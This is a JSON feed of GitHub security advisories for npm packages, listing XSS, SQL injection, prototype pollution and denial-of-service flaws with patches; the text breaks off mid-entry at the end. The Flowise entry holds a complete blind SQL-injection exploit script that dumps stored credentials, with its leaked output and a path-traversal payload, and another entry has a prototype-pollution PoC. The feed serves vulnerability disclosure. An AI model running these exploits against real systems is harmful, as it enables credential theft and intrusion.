{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>In koa &lt; 2.16.1 and &lt; 3.0.0-alpha.5, passing untrusted user input to ctx.redirect() even after sanitizing it, may execute javascript code on the user who use the app.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is patched in  2.16.1 and 3.0.0-alpha.5.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/linhnph05/03d677b183636af206ff781bdd19701a\">https://gist.github.com/linhnph05/03d677b183636af206ff781bdd19701a</a></p>\n<h3 id=\"impact\">Impact</h3>\n<ol>\n<li>Redirect user to another phishing site</li>\n<li>Make request to another endpoint of the application based on user's cookie</li>\n<li>Steal user's cookie</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v\">https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v</a></li>\n<li><a href=\"https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312\">https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x2rg-q646-7m2v\">https://github.com/advisories/GHSA-x2rg-q646-7m2v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x2rg-q646-7m2v",
            "title": "[koa] Koajs vulnerable to Cross-Site Scripting (XSS) at ctx.redirect() function",
            "date_modified": "2025-04-09T13:00:07.000Z",
            "date_published": "2025-04-09T13:00:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x2rg-q646-7m2v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>In koa &lt; 2.16.1 and &lt; 3.0.0-alpha.5, passing untrusted user input to ctx.redirect() even after sanitizing it, may execute javascript code on the user who use the app.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is patched in  2.16.1 and 3.0.0-alpha.5.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/linhnph05/03d677b183636af206ff781bdd19701a\">https://gist.github.com/linhnph05/03d677b183636af206ff781bdd19701a</a></p>\n<h3 id=\"impact\">Impact</h3>\n<ol>\n<li>Redirect user to another phishing site</li>\n<li>Make request to another endpoint of the application based on user's cookie</li>\n<li>Steal user's cookie</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v\">https://github.com/koajs/koa/security/advisories/GHSA-x2rg-q646-7m2v</a></li>\n<li><a href=\"https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312\">https://github.com/koajs/koa/commit/ff25eb4a7f2392df46481fe86355161067687312</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x2rg-q646-7m2v\">https://github.com/advisories/GHSA-x2rg-q646-7m2v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x2rg-q646-7m2v",
            "title": "[koa] Koajs vulnerable to Cross-Site Scripting (XSS) at ctx.redirect() function",
            "date_modified": "2025-04-09T13:00:07.000Z",
            "date_published": "2025-04-09T13:00:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x2rg-q646-7m2v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper neutralization of the <code>order</code>/<code>sort</code> parameter in the TypeORM adapter, which allows SQL injection.</p>\n<p>You are impacted by this vulnerability if you are using the TypeORM adapter, ordering is enabled and you have not set-up a property filter.</p>\n<p>Versions 0.0.1, 0.0.2 and 0.0.3 are affected by this vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been fixed in version 0.1.0 and newer, which introduces TypeORM field validation (enabled by default).</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<h4 id=\"add-an-allowlist-of-fields\">Add an allowlist of fields</h4>\n<p>List all valid fields and use the <code>filterProperties</code> function to filter out invalid fields before passing the crudRequest to the <code>TypeOrmQueryAdapter</code>. Here's an example:</p>\n<pre><code class=\"language-ts\">crudRequest = filterProperties(crudRequest, ['id', 'title', 'category.name']);\n</code></pre>\n<h4 id=\"disable-ordering\">Disable ordering</h4>\n<p>Cleanup the <code>order</code> field just before passing it to the <code>TypeOrmQueryAdapter</code>. Here's an example:</p>\n<pre><code class=\"language-ts\">crudRequest.order = [];\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Guichaguri/crud-query-parser/security/advisories/GHSA-9r25-rp3p-h2w4\">https://github.com/Guichaguri/crud-query-parser/security/advisories/GHSA-9r25-rp3p-h2w4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32020\">https://nvd.nist.gov/vuln/detail/CVE-2025-32020</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9r25-rp3p-h2w4\">https://github.com/advisories/GHSA-9r25-rp3p-h2w4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9r25-rp3p-h2w4",
            "title": "[crud-query-parser] crud-query-parser SQL Injection vulnerability",
            "date_modified": "2025-04-09T12:57:14.000Z",
            "date_published": "2025-04-09T12:57:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9r25-rp3p-h2w4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Incorrect <code>number</code> DER encoding can lead to denial on service for absolute values in the range <code>2**31</code> -- <code>2**32 - 1</code>. The arithmetic in the <code>numBitLen</code> didn't take into account that values in this range could result in a negative result upon applying the <code>&gt;&gt;</code> operator, leading to an infinite loop.</p>\n<p>In addition, <code>number</code> encoding had a few other issues that resulted it in it not encoding values correctly.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue is patched in version <code>1.0.4</code>. Users are recommended to upgrade as soon as possible.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If upgrading is not an option, the issue can be mitigated by validating inputs to <code>Asn1Integer</code> to ensure that they are not smaller than <code>-2**31 + 1</code> and no larger than <code>2**31 - 1</code>. Although <code>Asn1Integer</code> supports <code>bigint</code> inputs, some additional implementation issues make using <code>bigint</code> as a mitigation inviable, as it will result in incorrect values.</p>\n<p>If upgrading is not an option and range checks are impractical or undesirable, input to <code>Asn1Integer</code> can be provided as a buffer to be used directly. Note that this requires computing the correct DER encoding externally.</p>\n<h3 id=\"references\">References</h3>\n<p>N/A</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ApelegHQ/ts-asn1-der/security/advisories/GHSA-p4qw-7j9g-5h53\">https://github.com/ApelegHQ/ts-asn1-der/security/advisories/GHSA-p4qw-7j9g-5h53</a></li>\n<li><a href=\"https://github.com/ApelegHQ/ts-asn1-der/commit/b2bc9032cbe19755d234a27d79e47a7e52993af8\">https://github.com/ApelegHQ/ts-asn1-der/commit/b2bc9032cbe19755d234a27d79e47a7e52993af8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32029\">https://nvd.nist.gov/vuln/detail/CVE-2025-32029</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p4qw-7j9g-5h53\">https://github.com/advisories/GHSA-p4qw-7j9g-5h53</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p4qw-7j9g-5h53",
            "title": "[@apeleghq/asn1-der] ts-asn1-der has Incorrect DER Encoding of Numbers Leading to Denial of Service and Incorrect Value Representation",
            "date_modified": "2025-04-08T17:49:40.000Z",
            "date_published": "2025-04-07T21:11:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p4qw-7j9g-5h53"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>When generating an ESTree from a value with a property named <code>__proto__</code>, <code>valueToEstree</code> would generate an object that specifies a prototype instead.</p>\n<p>Example:</p>\n<pre><code class=\"language-js\">import { generate } from 'astring'\nimport { valueToEstree } from 'estree-util-value-to-estree'\n\nconst estree = valueToEstree({\n  ['__proto__']: {}\n})\nconst code = generate(estree)\nconsole.log(code)\n</code></pre>\n<p>Output:</p>\n<pre><code class=\"language-js\">{\n  \"__proto__\": {}\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>This was fixed in version <a href=\"https://github.com/remcohaszing/estree-util-value-to-estree/releases/tag/v3.3.3\">3.3.3</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you control the input, don’t specify a property named <code>__proto__</code>. If you don’t control the output, strip any properties named <code>__proto__</code> before passing it to <code>valueToEstree</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/remcohaszing/estree-util-value-to-estree/security/advisories/GHSA-f7f6-9jq7-3rqj\">https://github.com/remcohaszing/estree-util-value-to-estree/security/advisories/GHSA-f7f6-9jq7-3rqj</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32014\">https://nvd.nist.gov/vuln/detail/CVE-2025-32014</a></li>\n<li><a href=\"https://github.com/remcohaszing/estree-util-value-to-estree/commit/d0c394fbc64bc55937ffe4e162b81f15ba506e55\">https://github.com/remcohaszing/estree-util-value-to-estree/commit/d0c394fbc64bc55937ffe4e162b81f15ba506e55</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f7f6-9jq7-3rqj\">https://github.com/advisories/GHSA-f7f6-9jq7-3rqj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f7f6-9jq7-3rqj",
            "title": "[estree-util-value-to-estree] estree-util-value-to-estree allows prototype pollution in generated ESTree",
            "date_modified": "2025-04-07T19:09:53.000Z",
            "date_published": "2025-04-07T19:09:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f7f6-9jq7-3rqj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<h2 id=\"summary\">Summary</h2>\n<p>A vulnerability in Apollo Gateway allowed queries with deeply nested and reused named fragments to be prohibitively expensive to query plan, specifically due to internal optimizations being frequently bypassed. This could lead to excessive resource consumption and denial of service.</p>\n<h2 id=\"details\">Details</h2>\n<p>The query planner includes an optimization that significantly speeds up planning for applicable GraphQL selections. However, queries with deeply nested and reused named fragments can generate many selections where this optimization does not apply, leading to significantly longer planning times. Because the query planner does not enforce a timeout, a small number of such queries can render gateway inoperable.</p>\n<h2 id=\"fixmitigation\">Fix/Mitigation</h2>\n<ul>\n<li>A new <strong>Query Optimization Limit</strong> metric has been added:<ul>\n<li>This metric approximates the number of selections that cannot be skipped by the existing optimization.</li>\n<li>The metric is checked against a limit to prevent excessive computation.</li>\n</ul>\n</li>\n</ul>\n<p>Given the complexity of query planning optimizations, we will continue refining these solutions based on real-world performance and accuracy tests.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>This has been remediated in <code>@apollo/gateway</code> version 2.10.1.</p>\n<h1 id=\"workarounds\">Workarounds</h1>\n<p>No known direct workarounds exist.</p>\n<h1 id=\"references\">References</h1>\n<p><a href=\"https://www.apollographql.com/docs/graphos/reference/federation/query-plans\">Query Planning Documentation</a></p>\n<h2 id=\"acknowledgements\">Acknowledgements</h2>\n<p>We appreciate the efforts of the security community in identifying and improving the performance and security of query planning mechanisms.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/apollographql/federation/security/advisories/GHSA-p2q6-pwh5-m6jr\">https://github.com/apollographql/federation/security/advisories/GHSA-p2q6-pwh5-m6jr</a></li>\n<li><a href=\"https://github.com/apollographql/federation/pull/3236\">https://github.com/apollographql/federation/pull/3236</a></li>\n<li><a href=\"https://github.com/apollographql/federation/releases/tag/%40apollo%2Fgateway%402.10.1\">https://github.com/apollographql/federation/releases/tag/%40apollo%2Fgateway%402.10.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32031\">https://nvd.nist.gov/vuln/detail/CVE-2025-32031</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p2q6-pwh5-m6jr\">https://github.com/advisories/GHSA-p2q6-pwh5-m6jr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p2q6-pwh5-m6jr",
            "title": "[@apollo/gateway] Apollo Gateway Query Planner Vulnerable to Excessive Resource Consumption via Optimization Bypass",
            "date_modified": "2025-04-08T17:51:03.000Z",
            "date_published": "2025-04-07T19:03:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p2q6-pwh5-m6jr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<h2 id=\"summary\">Summary</h2>\n<p>A vulnerability in Apollo Gateway allowed queries with deeply nested and reused named fragments to be prohibitively expensive to query plan, specifically during named fragment expansion. This could lead to excessive resource consumption and denial of service.</p>\n<h2 id=\"details\">Details</h2>\n<p>Named fragments were being expanded once per fragment spread during query planning, leading to exponential resource usage when deeply nested and reused fragments were involved.</p>\n<h2 id=\"fixmitigation\">Fix/Mitigation</h2>\n<p>A new <strong>Query Fragment Expansion Limit</strong> metric has been introduced:</p>\n<ul>\n<li>This metric computes the number of selections a query would have if its fragment spreads were fully expanded.</li>\n<li>The metric is checked against a limit to prevent excessive computation.</li>\n</ul>\n<h1 id=\"patches\">Patches</h1>\n<p>This has been remediated in <code>@apollo/gateway</code> version 2.10.1.</p>\n<h1 id=\"workarounds\">Workarounds</h1>\n<p>No known direct workarounds exist.</p>\n<h1 id=\"references\">References</h1>\n<p><a href=\"https://www.apollographql.com/docs/graphos/reference/federation/query-plans\">Query Planning Documentation</a></p>\n<h2 id=\"acknowledgements\">Acknowledgements</h2>\n<p>We appreciate the efforts of the security community in identifying and improving the performance and security of query planning mechanisms.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/apollographql/federation/security/advisories/GHSA-q2f9-x4p4-7xmh\">https://github.com/apollographql/federation/security/advisories/GHSA-q2f9-x4p4-7xmh</a></li>\n<li><a href=\"https://github.com/apollographql/federation/pull/3236\">https://github.com/apollographql/federation/pull/3236</a></li>\n<li><a href=\"https://github.com/apollographql/federation/releases/tag/%40apollo%2Fgateway%402.10.1\">https://github.com/apollographql/federation/releases/tag/%40apollo%2Fgateway%402.10.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32030\">https://nvd.nist.gov/vuln/detail/CVE-2025-32030</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q2f9-x4p4-7xmh\">https://github.com/advisories/GHSA-q2f9-x4p4-7xmh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q2f9-x4p4-7xmh",
            "title": "[@apollo/gateway] Apollo Gateway Query Planner Vulnerable to Excessive Resource Consumption via Named Fragment Expansion",
            "date_modified": "2025-04-08T17:51:04.000Z",
            "date_published": "2025-04-07T19:03:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q2f9-x4p4-7xmh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>import functions are vulnerable.</p>\n<ul>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/chatflows/index.ts#L219\">importChatflows</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/tools/index.ts#L85\">importTools</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/blob/main/packages/server/src/services/variables/index.ts\">importVariables</a></li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<p><strong>Authenticated user</strong> can call importChatflows API, import json file such as <code>AllChatflows.json</code>.\nbut Due to insufficient validation to chatflow.id in importChatflows API, 2 issues arise.</p>\n<p><strong>Issue 1 (Bug Type)</strong></p>\n<ol>\n<li>Malicious user creates <code>AllChatflows.json</code> file by adding <code>../</code> and arbitrary path to the chatflow.id of the json file.<pre><code class=\"language-json\">{\n  \"Chatflows\": [\n    {\n      \"id\": \"../../../../../../apikey\",\n      \"name\": \"clickme\",\n      \"flowData\": \"{}\"\n    }\n  ]\n}\n</code></pre>\n</li>\n<li>Victim download this file, and import this to flowise.</li>\n<li>When victim click created chatflow, victim access to flowise:3000/canvas/{chatflow.id}.</li>\n</ol>\n<p><strong>Issue 2 (Vulnerability Type)</strong>\nimportChatflows API use unsafe SQL Query.</p>\n<pre><code class=\"language-javascript\">// packages/server/src/services/chatflows/index.ts\nconst importChatflows = async (newChatflows: Partial&lt;ChatFlow&gt;[]): Promise&lt;any&gt; =&gt; {\n        try {\n        const appServer = getRunningExpressApp()\n\n        // step 1 - check whether file chatflows array is zero\n        if (newChatflows.length == 0) return\n\n        // step 2 - check whether ids are duplicate in database\n        let ids = '('\n        let count: number = 0\n        const lastCount = newChatflows.length - 1\n        newChatflows.forEach((newChatflow) =&gt; {\n            ids += `'${newChatflow.id}'`           // &lt;===== user input\n            if (lastCount != count) ids += ','\n            if (lastCount == count) ids += ')'\n            count += 1\n        })\n\n        const selectResponse = await appServer.AppDataSource.getRepository(ChatFlow)\n            .createQueryBuilder('cf')\n            .select('cf.id')\n            .where(`cf.id IN ${ids}`)                   // &lt;===== here\n            .getMany()\n        const foundIds = selectResponse.map((response) =&gt; {\n            return response.id\n        })\n</code></pre>\n<p>It changes like <code>SELECT cf.id FROM cf WHERE cf.id IN ('{USER-INPUT...}')</code> by the code above.\nWhen  <code>') {Malicious SQL Query} --</code> is passed to newChatflow.id, SQL Injection occurs.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-python\">import argparse\nimport requests\n\n\ndef import_chatflows(\n    url: str,\n    token: str,\n    payload: dict\n):\n    response = requests.post(\n        f'{url}/api/v1/chatflows/importchatflows',\n        headers={\n            'Authorization': f'Bearer {token}'\n            # 'Authorization': f'Basic {token}'\n        },\n        json=payload\n    )\n\n    return response.json()\n\n\ndef import_normal_data(\n    api_url: str,\n    token: str,\n    normal_data: str\n):\n    data_id = 'aaaaaa'\n\n    payload = {\n        \"Chatflows\": [\n            {\n                \"id\": data_id,\n                \"name\": normal_data,\n                \"flowData\": \"{}\"\n            }\n        ]\n    }\n\n    import_chatflows(\n        url=api_url,\n        token=token,\n        payload=payload\n    )\n    return data_id\n\n\ndef get_character(\n    api_url: str,\n    token: str,\n    data_id: str,\n    column_name: str,\n    index: int\n):\n    injection_query = f'(SELECT ascii(substr({column_name},{index},1)) FROM credential limit 0,1)'\n\n    def create_payload(\n        c: int\n    ):\n        return f\"{data_id}') and if (({injection_query})&lt;{c}, 0, 9e300 * 9e300); -- \"\n\n    chatflows_json = {\n        \"Chatflows\": [\n            {\n                \"id\": \"\",\n                \"name\": data_id,\n                \"flowData\": \"{}\"\n            }\n        ]\n    }\n\n    bitbox = [\n        64, 32, 16, 8, 4, 2, 1\n    ]\n    character = 0\n    for bit in bitbox:\n        payload = create_payload(c=character + bit)\n        chatflows_json['Chatflows'][0]['id'] = payload\n\n        res = import_chatflows(\n            url=api_url,\n            token=token,\n            payload=chatflows_json\n        )\n        if 'DOUBLE value is out of range' in res['message']:\n            # character is more then bit\n            character += bit\n        else:\n            # character is less then bit\n            character += 0\n\n    return chr(character)\n\n\ndef get_length(\n    api_url: str,\n    token: str,\n    data_id: str,\n    column_name: str\n):\n    injection_query = f'(SELECT length({column_name}) FROM credential limit 0,1)'\n\n    def create_payload(\n        c: int\n    ):\n        return f\"{data_id}') and if (({injection_query})&lt;{c}, 0, 9e300 * 9e300); -- \"\n\n    chatflows_json = {\n        \"Chatflows\": [\n            {\n                \"id\": \"\",\n                \"name\": data_id,\n                \"flowData\": \"{}\"\n            }\n        ]\n    }\n\n    column_len = 0\n    bitbox = [\n        256, 128, 64, 32, 16, 8, 4, 2, 1\n    ]\n    for bit in bitbox:\n        payload = create_payload(c=column_len + bit)\n        chatflows_json['Chatflows'][0]['id'] = payload\n\n        res = import_chatflows(\n            url=api_url,\n            token=token,\n            payload=chatflows_json\n        )\n        if 'DOUBLE value is out of range' in res['message']:\n            # column_len is more then bit\n            column_len += bit\n        else:\n            # column_len is less then bit\n            column_len += 0\n\n    return column_len\n\n\ndef main(\n    url: str,\n    token: str\n):\n    api_url = url\n\n    column_box = [\n        'credentialName',\n        'encryptedData'\n    ]\n\n    data_id = import_normal_data(\n        api_url=api_url,\n        token=token,\n        normal_data='flow01'\n    )\n\n    for column_name in column_box:\n        column_len = get_length(\n            api_url=api_url,\n            token=token,\n            data_id=data_id,\n            column_name=column_name\n        )\n\n        print(f'[+] {column_name} length is {column_len}')\n\n        result = ''\n        for i in range(column_len):\n            result += get_character(\n                api_url=api_url,\n                token=token,\n                data_id=data_id,\n                column_name=column_name,\n                index=i + 1\n            )\n\n        print(f'[+] {column_name}: {result}')\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        '--url',\n        type=str,\n        default='http://flowise:3000'\n    )\n    parser.add_argument(\n        '--access',\n        type=str,\n        required=True,\n        help='Get from http://flowise:3000/apikey'\n    )\n\n    m_args = parser.parse_args()\n\n    main(\n        url=m_args.url,\n        token=m_args.access\n    )\n</code></pre>\n<p><strong>poc results: encryptedData from flowise database credential table was successfully leaked.</strong></p>\n<pre><code>/app # python ex2.py --url http://flowise:3000 --access \"blahblah~~~\"\n[+] credentialName length is 9\n[+] credentialName: openAIApi\n[+] encryptedData length is 88\n[+] encryptedData: U2FsdGVkX19LlIhbD4M9q9reLWQilBY6ffWo2S9PQ669CP1HpMPa5g1h1rJL0ZK3x0UMsLi/8Pz6TbSFrmIZbg==\n</code></pre>\n<p>It is recommended to limit all chatflow ids &amp; chat ids to UUID.</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>Database leak</li>\n<li>Lateral Movement</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9c4c-g95m-c8cp\">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-9c4c-g95m-c8cp</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/pull/4226\">https://github.com/FlowiseAI/Flowise/pull/4226</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9c4c-g95m-c8cp\">https://github.com/advisories/GHSA-9c4c-g95m-c8cp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9c4c-g95m-c8cp",
            "title": "[flowise] FlowiseDB vulnerable to SQL Injection by authenticated users",
            "date_modified": "2025-04-07T18:55:16.000Z",
            "date_published": "2025-04-07T18:55:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9c4c-g95m-c8cp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Vulnerability type:</strong>\nPrototype Pollution</p>\n<p><strong>Affected Package:</strong></p>\n<ul>\n<li>Product: js-object-utilities</li>\n<li>Version: 2.2.0</li>\n</ul>\n<p><strong>Remedy:</strong></p>\n<p>Update package to version 2.2.1.</p>\n<p><strong>Vulnerability Location(s):</strong></p>\n<pre><code class=\"language-js\">at module.exports (/node_modules/js-object-utilities/dist/set.js:16:29)\n</code></pre>\n<p><strong>Description:</strong></p>\n<p>The latest version of <code>js-object-utilities (2.2.0)</code>, (previous versions are also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>lib.set</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>\n<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>\n<p><strong>PoC:</strong></p>\n<pre><code class=\"language-bash\">// install the package with the latest version\n~$ npm install js-object-utilities@2.2.0\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n</code></pre>\n<pre><code class=\"language-js\">// poc.js\n(async () =&gt; {\n    const lib = await import('js-object-utilities');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        Reflect.apply(lib.set, {}, [someObj, \"__proto__.pollutedKey\", 123]);\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\n</code></pre>\n<p><strong>Reporter Credit:</strong></p>\n<p>Tariq Hawis</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rrainn/js-object-utilities/security/advisories/GHSA-hpqf-m68j-2pfx\">https://github.com/rrainn/js-object-utilities/security/advisories/GHSA-hpqf-m68j-2pfx</a></li>\n<li><a href=\"https://github.com/rrainn/js-object-utilities/commit/05ca694207270b7de275767f3fc93a2a643692a7\">https://github.com/rrainn/js-object-utilities/commit/05ca694207270b7de275767f3fc93a2a643692a7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hpqf-m68j-2pfx\">https://github.com/advisories/GHSA-hpqf-m68j-2pfx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hpqf-m68j-2pfx",
            "title": "[js-object-utilities] js-object-utilities Vulnerable to Prototype Pollution",
            "date_modified": "2025-04-07T18:52:05.000Z",
            "date_published": "2025-04-07T18:52:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hpqf-m68j-2pfx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was identified in <code>tarteaucitron.js</code>, allowing a user with high privileges (access to the site's source code or a CMS plugin) to enter a URL containing an insecure scheme such as <code>javascript:alert()</code>. Before the fix, URL validation was insufficient, which could allow arbitrary JavaScript execution if a user clicked on a malicious link.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>An attacker with high privileges could insert a link exploiting an insecure URL scheme, leading to:</p>\n<ul>\n<li>Execution of arbitrary JavaScript code</li>\n<li>Theft of sensitive data through phishing attacks</li>\n<li>Modification of the user interface behavior</li>\n</ul>\n<h2 id=\"fix-httpsgithubcomamaurictarteaucitronjscommit2fa1e01023bce2e4b813200600bb1619d56ceb02\">Fix <a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02\">https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02</a></h2>\n<p>The issue was resolved by enforcing strict URL validation, ensuring that they start with <code>http://</code> or <code>https://</code> before being used.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-p5g4-v748-6fh8\">https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-p5g4-v748-6fh8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-31476\">https://nvd.nist.gov/vuln/detail/CVE-2025-31476</a></li>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02\">https://github.com/AmauriC/tarteaucitron.js/commit/2fa1e01023bce2e4b813200600bb1619d56ceb02</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p5g4-v748-6fh8\">https://github.com/advisories/GHSA-p5g4-v748-6fh8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p5g4-v748-6fh8",
            "title": "[tarteaucitronjs] tarteaucitron.js allows url scheme injection via unfiltered inputs",
            "date_modified": "2025-04-07T16:47:00.000Z",
            "date_published": "2025-04-07T16:46:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p5g4-v748-6fh8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability was identified in <code>tarteaucitron.js</code>, where the <code>addOrUpdate</code> function, used for applying custom texts, did not properly validate input. This allowed an attacker with direct access to the site's source code or a CMS plugin to manipulate JavaScript object prototypes, leading to potential security risks such as data corruption or unintended code execution.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>An attacker with high privileges could exploit this vulnerability to:</p>\n<ul>\n<li>Modify object prototypes, affecting core JavaScript behavior,</li>\n<li>Cause application crashes or unexpected behavior,</li>\n<li>Potentially introduce further security vulnerabilities depending on the application's architecture.</li>\n</ul>\n<h2 id=\"fix-httpsgithubcomamaurictarteaucitronjscommit74c354c413ee3f82dff97a15a0a43942887c2b5b\">Fix <a href=\"https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b\">https://github.com/AmauriC/tarteaucitron.js/commit/74c354c413ee3f82dff97a15a0a43942887c2b5b</a></h2>\n<p>The issue was resolved by ensuring that user-controlled inputs cannot modify JavaScript object prototypes.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-4hwx-xcc5-2hfc\">https://github.com/AmauriC/tarteaucitron.js/security/advisories/GHSA-4hwx-xcc5-2hfc</a></li>\n<li><a 